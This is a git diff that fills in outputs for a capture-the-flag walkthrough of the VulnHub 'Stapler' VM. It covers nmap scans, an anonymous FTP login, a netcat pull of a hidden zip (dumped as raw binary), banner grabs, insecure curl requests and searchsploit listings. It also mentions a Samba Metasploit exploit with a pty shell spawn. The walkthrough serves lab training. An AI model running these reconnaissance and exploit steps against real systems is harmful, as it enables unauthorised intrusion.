@@ -4,10 +4,11 @@ topic: vulnHub
 ---
 Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/stapler/Stapler.zip) - PoC Page!
 
+> Mid assessment I switched out to a clean VM for evidence, which gave the a new IP to Stapler files may reference final octet of 104/105  on the IP. They are the same VM.
+
 ### Todos
 
 * need images or outputs from triage!
-* fix the terminal outs to be plain code blocks and not bash
 
 ## Setup
 
@@ -34,12 +35,13 @@ We can cut all the surplus text out and multi-thread with the following command:
 nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
 ```
 Returns a couple of addresses quickly
+
 ```
-192.168.56.1
-192.168.56.104
+192.168.56.1 # This is me
+192.168.56.104 # This is Victim!
 ```
 
-Because I'm lazy I'll assign the IP Address to a variable:
+If you are lazy like I am sometimes, assign the target IP Address to a variable:
 
 ``` bash
 STAPLER_IP=192.168.56.104
@@ -425,7 +427,7 @@ FTP has anon login and fred and kathy are both users.
 
 We get a lot of good info, but the information that is of most interest is the Samba version as 4.3.9-Ubuntu is vulnerable to Eternal Red
 
-> TODO get outputs
+Doing the following shows a path to get root 
 
 ``` bash
 searchsploit samba 4
@@ -433,11 +435,8 @@ searchsploit samba 4
 Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                          | exploits/linux/remote/42084.rb
 ```
 
-
-ok, from experience this should be a point and shoot to win.
-lets fie up msf:
-
-> TODO get outputs
+ok, from experience I know this should be a point and shoot to win.
+fire up of msf and running the following will take us there:
 
 ``` bash
 mfsconsole
@@ -455,8 +454,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 id
 ```
 
-Confession time, we cheated a little as this exploit came out after the box was made.
-Lets dig a bit deeper.
+We won't go through this way as Eternal Red was a serious issue that came out after this box was deployed to VulnHub. While it will work, it isn't something the box designer had in mind. 
 
 -----------------------------
 
@@ -464,17 +462,53 @@ Lets dig a bit deeper.
 
 Lets look at the ftp service: 
 
-> TODO get outputs
-
 ``` bash
 ftp $STAPLER_IP 
+```
+returns a login
+```
+Connected to 192.168.56.105.
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+220-
+220 
+Name (192.168.56.105:bhero): 
 # another user harry
+```
+lets try be anonymous:
+
+``` bash
 anonymous
-ls
+#no password needed!
+331 Please specify the password.
+Password:
+```
+I'm in!, lets get a file listing!
+
+``` Bash
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             107 Jun 03  2016 note
+226 Directory send OK.
 #lets get the file
 get note
 ```
-After reading the note, elly is another user, and she has an ftp account!
+returns the [note](/assets/vulnhub_stuff/stapler/note.txt)
+
+```
+local: note remote: note
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note (107 bytes).
+226 Transfer complete.
+107 bytes received in 0.00 secs (36.0070 kB/s
+```
+
+After reading the [note](/assets/vulnhub_stuff/stapler/note.txt), elly is another user, and she has an ftp account!
 Not much else we can do from here without going fully on the offensive, lets move on.
 
 -----------------------------
@@ -483,16 +517,160 @@ Not much else we can do from here without going fully on the offensive, lets mov
 Port 666 is interesting, it looks like we might have a potential custom app.
 lets investigate with nc
 
-> TODO get outputs
-
 ``` bash
 # connect to victim on port 666
 nc $STAPLER_IP 666
 ```
 
-This gives us what looks like binary data, lets stick it in a file and see what kind of data we have.
+This gives us a messy output: 
 
-> TODO get outputs
+```
+Pd��Hp���,2
+           message2.jpgUT       +�QWJ�QWux
+                                          ��z
+                                             T��P���A@� �UT�T�2>��RDK�Jj�"DL[E�
+                                                                               0<Ĵ�ʮn���V�W�H ����
+_�dr���9��u�Y�ܳoX�Y�2�e�����=2��y}�a����>`� �:�y�����^�sC��
+                                                          ��ncܤI��+j�[����=,Κ����s�޽���is�M?����eY��������]sS�bQ���AoA��9ӂ���x�Oݙ4����1�N���3w�&&q��'i�fL��\���̀ޚ��:�ũ�r����{���:i���T�/�-W׷&�N�<�\.���Ф���^���g�.ּ�|W�����j�f~��x'�󯏹O��̚��`aТ�KV��
+ou����7�|��ÄO�nKܾ#)���{���g8�u([r�H~A�qYQq�w��?}��?��Ty��ժk��SW������f�F�k����y������Y_?n2���߆^
+                                                                                              ����m��f".��?B����,��[�&�NbM���V��   3&M~{����-�]_��[qt��o/ֶ�������׏����_@N�����{��E������i�.L�\gD��p���Ym
+SWb�N�&���vO�3A#�,��^������4�C͈�}��~�R�`wT��KTamۙf�                           I�ˇ9-a)T�$��Z��E�<C�p�Џ�u�vT�'��ST%�5��
+��L}AJ�H�2�(Okɩ����dN���.npy.9��Rr9�Ү�#�Og���~�]V�BGu�=��HU���I��GTQ���
+                                                                       L�ڒ��*P?����Dfv�`��k�S�P0���
+���q�2��t�w����;����G����?P]�V���4<Q{>�h(}]LE�Hi��2~�@ǝ�xn籡��U���'4�z��%jow^Mo�~:� ��y򃙯νn����=fa���r�ٰ��U�t�y��B~q^7�,���:��ҩ;��ȝ��{���O 1M�ˁ�Ĉ��T��Y��Ԗ��Oְ7�:�/�7;��"3\܏��lt6"9:�?�,����My�Ք1��2�x5
+                                                                        ��z��z�(ho���cGBn]�3�О�7��JA�"ֹ
+                                                                                                      ��r�ej.�~�\G B���u�������!�BaB�V�'9�2��T�|�,����=�)p��w�����]T4�b�����&�k�]7��ciY"I4�P
+                                                                 n�����a�t������7��e�'Qnq���l����0�#U�b����!�KFl�����!Y���w7?������_��S7�#�:�W]���o�4���֗����Uy�JU��~��+w����*l�)7c_�\rz>0m
+                                                               �vۃF�q=��u��������:��c$G�ݧ}}��lii���p�8.��$9c5�x�z��P���u�З�v^Effu|LX+/S��d��y��#
+Ǘ�2���ΫX<c�;�GU��#��a�$v;H6)�4x�L��������i��J$C�V�c��N�K�_����k�WDbq����W��
+7'�W��l��Ct��쩘F���X�g�-!Lu��
+                             `0�o����
+�Lb���C�uR0@�j5�b86���!"�MM7���^������)����-�/`_�Ё5�!_h�����e�hy,0ytr�w�3�L�fGD��Df��X�o�5�w��
+                                                                                              �g�p{�c^������Ga�8�/
+��
+  .&�]��\�.X�(���OlU �vE�_��<y7褔-Y��?6l4Ȑ�+�}�����2�ks؅����fP�(��fֳ�~*�^�YV����H��s\,���k�ԗ�����mh�$Si_���J5�   �F�`f)��2\�����O�d������ti���h�z��ɔ���7��Bc��ث�N�j"'�Mo}|`�|�܉ ����.h씩�eD�C��������v�|�H2��4��T�r�˷�ݧ���-S��;�M���g���t�v}E.rի����pݦ���),R�UȜ��`1��%��Am92���K�ql'
+�"QyyEГ��,�W�   �U��
+%�H�e[�,�g�fjH�#RqR��+����[���t�[��V����_:��O��7����{��m����x��k_M?@공�R�C���K��I�ῢ;����T7�Ŋ;�
+                        8�{��6��V�X>�iW��%�tU:�Л�pBSK�����v��a��>���U@����:!u8�״=�g��a�
+                                                                                       L�zE�W���XO"T�`�U;BfUT�2L�ȳp�G9��'�9֠1�_���d�_���������~W���c�.>�1�L��fhi���4�y{���%�0k�ٶq���jkj�F��h���u�UGj��'�2���T`(՝I�v�����9A���ᒬ��G*��H8��5�>]�2�
+                                                                                                                   ����0�}�$r�sfЇ*Pb8�(�[�)��ɏޗe��1���ㄎ}
+                              �6��MGݮ�.��
+��6��.R�.,���i�z+4���,LwB�b*Δs��.2"nk�bȅ/\M�<̛r1b��Oi6��^~���=S��*��w�hYd�S�:�zd�ZSi��]�A�LH�3)�x�~c(^y�K"zm�[M��֙�%��ð���M�G@�jU�t�T��3>v�qڡ0��
+TlO��X��a�<���ov�)�Z�f�?�����:�0о���<��,���%*D�
+�9$F���$+،?a�K�hN<Ő
+X����   i;i�pj��sB�ɱ?�^
+����Fa�R͏X��W��8�[�?
+                   �n
+�':=9Y!(5)
++��b��_R�P拜��B�U�؎t�(�@ִ����y�_0��Hj/,�>TLky��%��_�|P����d�Y&o��<��B8ۺ���!���ْ/\_vi%r���KN�M�"��1�S��Q0����l
+9�`P�I<���������-�$U�z���ʁ�Ut}���5Q2����S�'J��8�@%��[
+�a�;�k�2��Pr���K�����a�9�|��d                        ��¾T�T��M�;�xL���M���N�SZA4�J����|����N���
+V��mt�#j->P: g��V�
+                   *����i�Ҳ���j�cRM���(�^��ړ��4�}kF<$Bݪ$���~��C��">��(�7�}2<�i_1��*�
+                                                                                        ��(��jҕS���v:��zX�w��=��!����JE���^i�֞j?;2��iqB'����m�X:o4)���~�m?�)C�F�����sB��$�ed�]�4­�L3��a��
+                                                             aIg
+                                                                %��s��|:��>⒳�yR(�҈*U\�\Rۻ2j�k�2�����&ђ{ �Db�9֘hsB�(�,/||@�J����ھ1��ә�
+        �x�|��^@���պ��|dpţ�v�0��k@�듃��
+t�p)<Z��U�'���x�`��I7���e`�1�2��+x%��mfb �4��!2���e1�8��E�Dg+2�I��/Qi����)nd�6j�8�R��f1JV����ݷ7�
+                                                  �a�C�R�Jb�Ls���j@�:~3����f�=W��<�������ӿ���}�볁��Y�
+                                                                                                     >���݋QA����nB��!�I$�$\�c*�����Mr����HZ|�y��mҮΒze0��S��>�BL5s}e�z搧���$͆2����c*������f�����Z�d�Oė�
+                                                                          ���]F��I�bbz#��z.i��S?gX�����q�����M-!M$��8e�ݫQ�e�y}�&E�������%\�j<t���ヵ�����)��-��
+��z���F�����������AǸ�/ȧ��SF�U'<���,,�"�9b�q�%\��-�=��'o�ɲw��6�WLI?[S��7x����ϞRi&����x"�v����h�:�p��� J����h*!���i~���t� ��ܲ�G�Սf'$S���)f5w)Q����ج*�ٽ+�Ww�H>|9���V�2Eq�����遳�H6pVnYp�<��f�����������y��K}�:g�J0ӂCY�{��o*%�4���v� v���a���vW�
+                                          m�����        e���;�I�eַ͜K��֣�-Kr
+                                                                        ��%E���a���-3����.�`T0�ӽ�4�����:�JXD����첈x���HP�`��o�QB��1�~��n�����g��=��F�y�i�
+                              �_̔v�L&e:U��L�
+                                           �
+                                            �Ѐ��M`��^x+o*�\�H9
+                                                              W��JT~�;"ؓ?�ʋq��=�x����&����A�2���EduS.x���鯗��f�X�`?���%����5Z���Bd�R5���{k#2        ��
+                          ݪ�a���e���bXl�=���Z�&K�}�D���4�NrL�dF�        ���]%W�}1�t%o
+ž�5��
+     Ӑ�'���*�`c��?7]����
+�DE|7�{��A�_�l5c���3��1�8�I�wy�(f�UA��(D�\��Z�B�T���d�ޝWSt�#Y���!�vŴ��Q�G�:R5�٥Tv+�Lӊ��U)K���J����kf�ryX����4m$�j��Do�?��ڄ�����=�T�s��w��SL����Y�M�a"km_�-jU��6?hh��j'92t-��U��{d7%�:�'
+                                                            ��5)�x�^�l��؛�uGϮ�2�����������-l�o)�(mM�����K}�J�i:�6�ap�\%�p ��(c�V9�w<��������
+    ���aeL��y�9��Q6�ֹ
+                    ��o��B�
+                           2_�.x2ܜ���H7���8�/�Le����0����$�U�\[��v�E?WV�~�ӑ���z���P5�i�a�"Ѥ���E�����e4����VK}����*����S"�4�C1���7�:V�o���g�S]u�#�k"�;��MrQRx1y]�C$���w��U�nR5����G���mWA��~�_^0Rkf��WS�Û�0��^u�I�?=�C{��1��m y���̢��M�7�랧�ښV0��ok��j)>���<:�$��&9y�#�kb�O']B2b�#�hY�A���\��)Yo���tixye��
+                                                  ȉA;{e��z��
+                                                            ���P�s��۽@��K��݃��ՆJ�v�g����wTJ�6;.,�縅�)f����jϛ�*�.8�Q�S�dyLw�4��#2�[��ኈ{�>�n�N�%�z��Uj�����XA�D׫h7��)'��V�p�L��l��1��0u��6���qB��_�PI9�'$W�@R��       %���4v[0�֫��2D�|���1�o$��C�_Vk��"}�<��t�pGwv/�DrN�Z�S��|��w�ۄ%���e7�L�ڱB�Cbܲ�c�i�d�M�
+            �����pn+p�����@3�P���m6�k��Z1 bd�XG*4�D�qBӞ3�VGϾgc��x6��i�o���Z%fC��w��qk�S�C�&�QJ����c
+3������+1*p�Z8���kYAv���7�
+             v��7���f���9���lRopG���?J���<��XK[fm4~01��]:?O�
+��Y��̆_#�ڬ�>c�>8�)�ם HuB�k���. uq}|����q�9~fM�ᦒ���<����%�PQ��Uܗ���l�%�:�gbJ8�8x��!�l��ó�A_]F��K�9b�n}�
+                                                                                                     ��
+                                                                                                       ��8�P�
+                                                                                                             �
+�>R=Z��%�X5�3ԇ]�S�V��`E�ڿU��Ɣ45��S�4�D�А��L���d)=;Ms_���]H�NQ,�$j
+��"�~[�e
+{�.�e.�=l b��:�����7�=
+                      4�1]M�.:X����Z�*�J
+                                        �zW���D�S��
+%����y�,A� ��=L<��0I��GG��ߞ5
+                           ��Q"&{T��}u4�{�2c�������+~����aߧ�I�c��L����mL���|S��/�i-
+�f�J�P��{4���e��W���>ȸڛ�\��1��^��@*�,�B莗���U�[q�&��                               %��~�Z�E�f
+                                                    �QƱ���k��Ĩ1\k-J
+�+�����fq��c"\��        ���zM$�o��C�����*G�����/R����ܾ.�t��z�
+        ��F��I������"�
+                      >Jv������9�R
+5`R��t���^�[�>���d��Qx�4GR�i�%��֓��hxn���&j^`���R��G�NR��%j�]�i^L��eL�tB����KT��D�z� 7��WwBn
+�3o#�9�gٺ�)w�� ն�Pi HQT͏5��K���P���;S��:��;[n�xKt��xU��Ǖ����L����Et@lڎ.j���H���"��V+f���4QO��)tB�����=}�q#�r�%t!c\֋O�7X��Ղr��dy"�Ə���s�s�T�p�D��5�݌k)IY�����`t0���/Z����٤e�&���&�->��$kl߁X���ʤϗr�w���T�ǜt�M����9�lxKo;ĸ$��Qa}L�\ ck�
+                                                                                                        �قi
+                                                                                                           i`o#��$>V1_\���'�2���C�\�����c۪r�T.'ldʽ+��@n���_\ıU8������6����6ƶWU�
+�8n�I��S�cr&,z�-�ˠ٫��I��SgTSa�SGN���)j4
+L��!��|�RaOmK�&���q;F�
+���@lG>-5�m�
+
+�>n�%}<8    �!����a�d��ɣ������f�J]ZI�A���k�����g}]v�t#�"�&��]̘�Z�$�g�'b�P�
+/�]R*��dx;\��)=��E���   �,��Q_�<S��Y��(�        ���W�Z>]C�&��7����~�d����W+�2��v.h�2;��hYݥ�3͊�P�����X]M[��y��L�U��V}�8�f�,�ge���|Ǐ-��
+Z�!o�
+     a �l���($��$�L�Mǳ���=��7�Z�g'Dٍ�ڽo�I�v���.HJ�nb��7���ןK4��bS���H��+�c��
+                                                                           Y�9�\�($����
+���%�   _�Ķ�i�RF��S�IG{���COy�(�H�����,���g��r�WC��ϰz��ea�xj����Z�B]Z�dS[�uX�}�P{fQ�ҏ�_�,�Nh��{�;}_41�d"���"��"
+ѕ�N��:��)}���ek���ڙat�A��{�"۹�                                                                                 ���V��GO�+
+��ז�����d�&~�O��r��<�Я��2��p���D�{g���C0z�]�e
+                                             ������Aќ^uls%����
+                                                              ��u|�ж�������g�wi�T��;�   U�,i?ѝ�X���
+�����zP�(/Bfu��9X�@�|S"2�'�`���S��`]K��%�ȉ�'Z�"p�A�)�����T�Ym��8s
+��^aQ�������<B��G�Z�۷hp+[2ɕ����'�*��ѵJ��+X Rラ�l5�%,}O�pO
+                                                         ������4[|�6���d�,
+LQ��=��9zf�-��W��~¤Ec����q)�Wվ����I�m��*�и�m�1p��A ��l�<I��VQk�<ҭ��H0g�Ě,���[�J���g������E|�hR�/��n�E51�K����s���Y���
+                                                                                                                     �z�A����X7i�dQs�������c�n�KHQ��Ϗ&����A��N���#6+=����
+                                              �9�
+                                                 �v���T�
+{x��D8B�R�1u���A���������2ڇ�{_
+                              6 8cwԻ90�
+#Oʉ:so���X��                           |ho�'3��8��w�q͵T�ߡ0��(7*�<
+            �loƎ3��ȏ%���P�kՌє�'�H�      47���RzDK��Q��`�����#1�����R*��9���7w�'�f�.�_cb�ŗV��kS`l�Cw��v�����1�z�27
+                                                                                                                 ����r��s[�����T8q���@��gl�z�&?��+�x킀�y��R�҅M�42���k�3O�$�Cw�^�D~����n?'���4�WW9!�K�+Ɏ{Z�?��2j�,�G�}B�硹WQO��|LM'��\tY-c��9�5��_�n{|��JX�Co�9��@S��{#~;�t������=W.��x=�sV�N�~=�L�V�eR�c��8�F
+                                                      l�×��D"��;�G�|��1�������F|��M���sɹ����ߍ�q�~�Ʉ����j�P[A�}%�ifx:5�`忎�M5'n2�K�D����G�S�cHA/�HT�I��֮�7�%��4�It@F//KU��h�G*���5�M�~[���:J�b�!:mnu�����>$�^���?b2c��N�ؔ����R����EF����-���4�I�VK���]�И����<Q�μ!QwE���U{D�
+                  ��e��l���|�J5����f$X�JC�*�K�~�<�d>��#��DvY��1d2��'�
+`�                                                                   _�t�#ә�s���;uq�m�
+�E�8K���ɞ�
+          ��5Nhz        ccc�
+
+                            �\S�
+�OX�3��ɬG(��~����r0*u�85_��M���к
+2��%\����T�>�r�\f�ey~ػ����cƛ�Fy浑�jG��ٱ>�gKk��/�G4����|@�s�B怊�ʅ����}�_�)I��=˂Ș�=����7����~��9U7�k������W�����C3�
+                                                ���z�ѫ�d�F�Na73R�%9'���[�l&Z*�K��r�P���T�Ɗ��:�~U�!Ц���
+                                                                                                      T�
+                                                                                                        |��II��Pqw��,�a
+                                                                                                                       �Ŕ�L6��E�F�n$�'J���c���`�D�+TVM_��{�
+$��-[12F�Ժ�     ��W�9c���r�)���9�yb��%�����ͬR���ۣ�N̽�f��_��9�;*�TwF�O�b
+"�O�c��F��uU�lg�3�ǃeQX4��:��nYư�q�@%������F�V. }ڄ~s?է�:�Sk�d(_L���ᄾ8������єI��~��N��rNA�7���6�
+                                                                                               �sU>S�b�j"�� g���k� ��UM�OE��8���ť��%#/ۙE���v�?��Kh��H��$�=��b;!(�(��e1���3��
+ ���s@�i�P�ۖ�~��ż�����s���u�ьS�e��p�m�f�Fc��5jŤ?��Rsg    ?�L��yB��dS�i[$�����4\<�ݲR��0��_Yx�A|�^���d<�H��8#���
+                                                                                                             *G*ͼ��@U^�?��i��1��)��?R�=��
+V�=�;���Db�2��ؾ��a'��*���
+                         ��$$��Ix�}��$[������8x�/0�|��poje�n�"}��3��A6�B        ]��#��{6�A�LrM,{2X��KַµB-�̪K�i���'p�^�ثu��繏�J�Du5Gs�\���D\���F��޴�զ�W3��.��V��n4�_r�,�oA��
+                                              �fOl�qR���������HK�]�d=��&Rۛ�N,{}�=��R�M��t�I�/L��-}��.�-��n"%ҹ�a��^��}�2�!0�jق#�}#�g�yw��/������$�J.w�y�ʉ[e�
+9<@�=��F�vi��!e:$p738�Z� �G�x��~��O�yfΟ��Q��;��i� 6FK�h�x���T�� m���
+                                                                    2��j���i���4*��v�P�'|��+8 ٶ�Ѩ��oB7��2e1�na�;�H��OM8G�/�^��*I��'��<�\B#��¾���7R��ґ���"~N1�og�a��p]K��£#h�:�p���M$��a\5yo
+BVQ�29fk>����/l0�^�l��
+9D��4�9ɱ�Ba�XV񭃷��`�K�e%9N�r�������q�ҁ���_Pd��Hp���,2
+                                                    ��message2.jpgUT+�QWux
+                                                                          �PKR�,
+```
+
+Looks like binary data, lets stick it in a file and see what kind of data we have.
 
 ``` bash
 nc $STAPLER_IP 666 > doom && file doom
@@ -502,17 +680,24 @@ doom: Zip archive data, at least v2.0 to extract
 mv doom doom.zip && unzip doom.zip
 ```
 
-> TODO get outputs
-
 this gives us ![message2.jpg](/assets/vulnhub_stuff/stapler/message2.jpg)
 ``` bash
 #check the jpeg for hidden stuff:
 file message2.jpg 
-strings message2.jpg
-# maybe an actual cookie? potentially just an easter egg though.
 ```
 
-We get another potential user, scott
+returns
+
+```
+message2.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, baseline, precision 8, 364x77, components 3
+```
+check for hidden strings
+
+``` bash
+strings message2.jpg > message2.txt
+```
+We get another potential user, scott from [message2.txt](/assets/vulnhub_stuff/stapler/message2.txt) and maybe an actual cookie? Potentially just an easter egg though.
+
 
 this takes us up to 5 users:
 
@@ -527,13 +712,33 @@ this takes us up to 5 users:
 ### MySQL
 Time to try mysql
 
-> TODO get outputs
-
-```
+``` bash
 nmap -A -p 3306 $STAPLER_IP
 ```
 
+gives
+
+```
+Host is up (0.0010s latency).
+
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.7.12-0ubuntu1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: 9
+|   Capabilities flags: 63487
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ODBCClient, InteractiveClient, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, LongPassword, Support41Auth, LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x16b?Fur\x07\x06-\x1BK       "W>\x01t`]h
+|_  Auth Plugin Name: 88
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
+```
+
 I get some useful info, but nothing I can leverage immediately, I try logging in as root:
+
 ``` bash
 mysql -h $STAPLER_IP -u root -p
 #use toor to try
@@ -554,12 +759,59 @@ ssh is next:
 ``` bash
 nmap -A -p 22 $STAPLER_IP
 ```
-gives a pretty standard response, but we get barry, another user from:
+gives a pretty standard response:
 
-> TODO get outputs
+```
+Host is up (0.0010s latency).
+
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql   MySQL 5.7.12-0ubuntu1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.12-0ubuntu1
+|   Thread ID: 9
+|   Capabilities flags: 63487
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, ODBCClient, InteractiveClient, SupportsTransactions, SupportsCompression, Speaks41ProtocolNew, ConnectWithDatabase, LongPassword, Support41Auth, LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x16b?Fur\x07\x06-\x1BK       "W>\x01t`]h
+|_  Auth Plugin Name: 88
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.61 seconds
+bhero@bh-t430:~/Documents/git_site/bovinehero.github.io/assets/vulnhub_stuff/stapler$ nmap -A -p 22 $STAPLER_IP
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 10:24 BST
+Nmap scan report for 192.168.56.105
+Host is up (0.00040s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
+|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
+|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
+```
+
+But we get barry, another user from:
 
 ``` bash
 ssh root@$STAPLER_IP
+```
+
+as shown:
+
+```
+The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
+ECDSA key fingerprint is SHA256:WuY26BwbaoIOawwEIZRaZGve4JZFaRo7iSvLNoCwyfA.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.56.104' (ECDSA) to the list of known hosts.
+-----------------------------------------------------------------
+~          Barry, don't forget to put a message here           ~
+-----------------------------------------------------------------
+root@192.168.56.104's password: 
 ```
 At this point I have a decent userlist starting to appear
 
@@ -582,30 +834,29 @@ FTP and Samba may offer us a potential file upload IF we can gain more leverage.
 ### HTTP
 lets check the default website
 
-> TODO get outputs
+``` 
+curl http://$STAPLER_IP/
 
 ```
-curl http://192.168.56.104/
-```
-returns a 404, no webroot? interesting could be a dead site.
-Lets try a nikto scan to see what we pick up
+returns a 404 page in html, no webroot? interesting could be a dead site.
 
-> TODO link file
+``` html
+<!doctype html><html><head><title>404 Not Found</title><style>
+```
+Lets write a nikto scan to [HTTP80.txt](/assets/vulnhub_stuff/stapler/HTTP80.txt], see what we pick up:
 
 ```
 nikto -h $STAPLER_IP > HTTP80.txt 
 ```
-Yeilds nothing, lets try the other one:
+Yeilds nothing of use in [HTTP80.txt](/assets/vulnhub_stuff/stapler/HTTP80.txt], lets try the other one:
 
 ```
-curl http://192.168.56.104:12380
+curl http://$STAPLER_IP:12380
 ```
-wow, lets put it in a file as the output is huge:
-
-> TODO link file
+wow, lets put it in a [file](/assets/vulnhub_stuff/stapler/12380_index.txt] as the output is huge:
 
 ```
-curl http://192.168.56.104:12380 > 12380_index.html
+curl http://$STAPLER_IP:12380 > 12380_index.txt
 ```
 
 code review gets another user __Zoe__
@@ -621,12 +872,10 @@ Doesn't appear to be any standard links within the site, lets check robots.txt t
 Viewing in the browser loads the index page, but the reload is strange almost a notable delay, try curl 
 
 ```
-curl http://192.168.56.104:12380/robots.txt
+curl http://$STAPLER_IP:12380/robots.txt
 ```
 
-I get the same result. Looks like I'm stuck, but I'll try nikto again
-
-> TODO get outputs
+I get the same result. Looks like I'm stuck, but I'll try nikto to a [file](/assets/vulnhub_stuff/stapler/HTTP12380.txt] again
 
 ```
 nikto -h $STAPLER_IP:12380 > HTTP12380.txt
@@ -642,7 +891,7 @@ and one from brute force:
 This is weird, I wonder why I keep getting a redirect. Lets try a curl for headers 
 
 ``` bash 
-curl -I http://192.168.56.104:12380
+curl -I http://$STAPLER_IP:12380
 # note the dave header!
 HTTP/1.1 400 Bad Request
 Date: Sun, 04 Aug 2019 22:14:55 GMT
@@ -659,31 +908,33 @@ Content-Type: text/html
 lets try https
 
 ``` bash
-curl https://192.168.56.104:12380/robots.txt
+curl https://$STAPLER_IP:12380/robots.txt
 # ah ha!
 curl: (60) SSL certificate problem: self signed certificate
 ```
 force insecure ssl because YOLO
 
 ``` bash
-curl https://192.168.56.104:12380/robots.txt -k
+curl https://$STAPLER_IP:12380/robots.txt -k
 # works! ha!
 User-agent: *
 Disallow: /admin112233/
 Disallow: /blogblog/
 ```
 
-> TODO get outputs
-
 lets try the sites:
 ``` bash
 # close call!
-curl https://192.168.56.104:12380/admin112233/ -k
+curl https://$STAPLER_IP:12380/admin112233/ -k > admin112233.txt
 # the wp site!
-curl https://192.168.56.104:12380/blogblog/ -k
+curl https://$STAPLER_IP:12380/blogblog/ -k > blogblog.txt
 # phpmyadmin
-curl https://192.168.56.104:12380/phpmyadmin/ -k
+curl https://$STAPLER_IP:12380/phpmyadmin/ -k > phpmyadmin.txt
 ```
+
+[admin112233.txt](/assets/vulnhub_stuff/stapler/admin112233.txt)
+[blogblog.txt](/assets/vulnhub_stuff/stapler/blogblog.txt)
+[phpmyadmin.txt](/assets/vulnhub_stuff/stapler/phpmyadmin.txt)
 
 -----------------------------
 
@@ -702,13 +953,74 @@ This line, suggests we are looking at version 4.5.4.1. We can't be 100%, but the
 <link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.5.4.1deb2ubuntu1" ....
 ```
 
-> TODO get outputs
+lets see if there are any exploits:
 
 ``` bash
 searchsploit phpmyadmin
 ```
+Output confirms it, without a new exploit we're going to need authentication to make use of this.
 
-Confirms it, without a new exploit we're going to need authentication to make use of this.
+```
+--------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                               |  Path
+                                                                                             | (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------- ----------------------------------------
+WordPress Plugin Portable phpMyAdmin - Authentication Bypass                                 | exploits/php/webapps/23356.txt
+XAMPP 3.2.1 & phpMyAdmin 4.1.6 - Multiple Vulnerabilities                                    | exploits/php/webapps/32721.txt
+phpMyAdmin - '/scripts/setup.php' PHP Code Injection                                         | exploits/php/webapps/8921.sh
+phpMyAdmin - 'pmaPWN!' Code Injection / Remote Code Execution                                | exploits/php/webapps/8992.php
+phpMyAdmin - 'preg_replace' (Authenticated) Remote Code Execution (Metasploit)               | exploits/php/remote/25136.rb
+phpMyAdmin - 'tbl_gis_visualization.php' Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/38440.txt
+phpMyAdmin - (Authenticated) Remote Code Execution (Metasploit)                              | exploits/php/remote/45020.rb
+phpMyAdmin - Client-Side Code Injection / Redirect Link Falsification                        | exploits/php/webapps/15699.txt
+phpMyAdmin - Config File Code Injection (Metasploit)                                         | exploits/php/webapps/16913.rb
+phpMyAdmin 2.11.1 - 'Server_Status.php' Cross-Site Scripting                                 | exploits/php/webapps/30733.txt
+phpMyAdmin 2.11.1 - 'setup.php' Cross-Site Scripting                                         | exploits/php/webapps/30653.txt
+phpMyAdmin 2.5.7 - Remote code Injection                                                     | exploits/php/webapps/309.c
+phpMyAdmin 2.6 - 'display_tbl_links.lib.php' Multiple Cross-Site Scripting Vulnerabilities   | exploits/php/webapps/25153.txt
+phpMyAdmin 2.6 - 'select_server.lib.php' Multiple Cross-Site Scripting Vulnerabilities       | exploits/php/webapps/25152.txt
+phpMyAdmin 2.6 - 'theme_left.css.php' Multiple Cross-Site Scripting Vulnerabilities          | exploits/php/webapps/25154.txt
+phpMyAdmin 2.6 - 'theme_right.css.php' Multiple Cross-Site Scripting Vulnerabilities         | exploits/php/webapps/25155.txt
+phpMyAdmin 2.6 - Multiple Local File Inclusions                                              | exploits/php/webapps/25156.txt
